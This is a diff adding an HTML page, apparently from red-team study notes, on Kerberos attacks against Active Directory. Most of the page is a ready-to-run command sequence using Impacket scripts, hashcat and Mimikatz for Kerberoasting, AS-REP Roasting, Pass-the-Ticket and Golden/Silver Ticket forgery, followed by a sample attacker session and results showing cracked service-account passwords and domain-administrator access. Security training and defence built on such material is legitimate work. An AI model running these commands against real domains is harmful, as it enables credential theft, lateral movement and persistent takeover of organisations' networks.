@@ -1,0 +1,188 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Kerberos Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Active Directory Security</strong> • Focus: <strong>Kerberos Authentication Attacks</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Kerberos is the authentication backbone of Active Directory. Exploitation targets its 
+    ticket-based mechanisms, enabling attackers to crack weak service accounts, bypass 
+    authentication, and persist at domain-admin level. Techniques include Kerberoasting, 
+    AS-REP Roasting, Pass-the-Ticket, and Golden/Silver Ticket forgery.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Service Accounts with SPNs:</strong> Often have weak or reused passwords.</li>
+    <li><strong>Users with "Do not require pre-auth":</strong> Exposed to AS-REP Roasting.</li>
+    <li><strong>Compromised KRBTGT hash:</strong> Allows forging of Golden Tickets.</li>
+    <li><strong>Service NTLM hashes:</strong> Enable Silver Ticket forgery for lateral movement.</li>
+    <li><strong>Weak Monitoring:</strong> Ticket abuse is hard to detect in noisy Kerberos traffic.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Recon:</strong> Enumerate domain accounts with SPNs (targets for Kerberoasting).</li>
+    <li><strong>Kerberoasting:</strong> Request TGS tickets and crack offline for service account passwords.</li>
+    <li><strong>AS-REP Roasting:</strong> Abuse accounts with no pre-authentication to extract hashes.</li>
+    <li><strong>Pass-the-Ticket:</strong> Replay valid Kerberos tickets for authentication without creds.</li>
+    <li><strong>Golden/Silver Tickets:</strong> Forge tickets using stolen hashes for persistence or lateral movement.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Recon: Enumerate SPNs (Kerberoasting targets)
+# ------------------------------
+python3 GetUserSPNs.py corp.local/jdoe:Winter2025 -dc-ip 192.168.1.50
+python3 GetUserSPNs.py corp.local/jdoe:Winter2025 -dc-ip 192.168.1.50 -request -outputfile spns.hashes
+
+# ------------------------------
+# Kerberoasting
+# ------------------------------
+hashcat -m 13100 spns.hashes rockyou.txt --force   # Crack TGS hashes
+
+# ------------------------------
+# AS-REP Roasting
+# ------------------------------
+python3 GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
+hashcat -m 18200 asrep.hashes rockyou.txt --force  # Crack AS-REP hashes
+
+# ------------------------------
+# Pass-the-Ticket
+# ------------------------------
+export KRB5CCNAME=/tmp/ticket.ccache
+kinit -c $KRB5CCNAME attacker@CORP.LOCAL
+python3 psexec.py -k -no-pass CORP/Administrator@dc01.corp.local
+
+# ------------------------------
+# Golden Ticket (Mimikatz)
+# ------------------------------
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /inject /name:krbtgt
+mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
+  /sid:S-1-5-21-11111-22222-33333 /krbtgt:[NTLM_HASH] /id:500
+mimikatz # misc::cmd
+
+# ------------------------------
+# Silver Ticket
+# ------------------------------
+mimikatz # kerberos::golden /user:svc_sql /domain:corp.local \
+  /sid:S-1-5-21-11111-22222-33333 /rc4:[NTLM_HASH] \
+  /service:MSSQLSvc /target:sql.corp.local
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ python3 GetUserSPNs.py corp.local/jdoe:Winter2025 -dc-ip 192.168.1.50
+ServicePrincipalName       Name       PasswordLastSet   LastLogon
+------------------------   --------   ---------------   -------------------
+MSSQLSvc/sql01.corp.local  svc_sql    2024-11-01        2025-08-30
+
+[ saide ~ ]$ hashcat -m 13100 spns.hashes rockyou.txt --force
+$krb5tgs$23$svc_sql@CORP.LOCAL:DBPassword123!
+
+[ saide ~ ]$ kinit svc_sql@CORP.LOCAL
+Password for svc_sql@CORP.LOCAL: DBPassword123!
+
+[ saide ~ ]$ python3 psexec.py CORP/svc_sql:DBPassword123!@sql01.corp.local
+[*] SMB session established
+[*] Launching semi-interactive shell
+C:\Windows\system32> whoami
+corp\\svc_sql
+
+[ saide ~ ]$ python3 GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
+[+] Found user with pre-auth disabled: j.doe@CORP.LOCAL
+[+] Hash written to asrep.hashes
+
+[ saide ~ ]$ hashcat -m 18200 asrep.hashes rockyou.txt --force
+j.doe@CORP.LOCAL : Welcome2025!
+
+[ saide ~ ]$ mimikatz
+mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-12345 /krbtgt:98ab23cde44a...
+Ticket forged successfully
+
+[ saide ~ ]$ dir \\dc01.corp.local\c$
+ Volume in drive C has no label.
+ Directory of \\dc01.corp.local\c$
+09/05/2025  10:22 AM    <DIR>          Windows
+09/05/2025  10:22 AM    <DIR>          Users
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Kerberos exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Kerberoasting cracked credentials
+svc_sql@CORP.LOCAL : DBPassword123!
+
+# AS-REP Roasting cracked credentials
+j.doe@CORP.LOCAL : Welcome2025!
+
+# Pass-the-Ticket
+Valid TGT replayed successfully -> authenticated as CORP\\Administrator on dc01.corp.local
+
+# Golden Ticket Forgery
+Forged TGT: Administrator@CORP.LOCAL valid for 10 years
+SID: S-1-5-21-11111-22222-33333-500
+
+# Silver Ticket Forgery
+Forged TGS for MSSQLSvc/sql01.corp.local as svc_sql
+Access: Full administrative rights on SQL01
+
+# Proof of Access
+C:\Windows\system32> whoami
+corp\\administrator
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-attacks" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Kerberos Attacks
+      </a>
+    </li>
+    <li>
+      <a href="https://adsecurity.org/?page_id=1821" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        ADSecurity – Kerberos Attack Methods
+      </a>
+    </li>
+    <li>Classic Red Team workflow: Kerberoasting → Cracking → Ticket Forgery → Domain Persistence.</li>
+  </ul>
+</section>
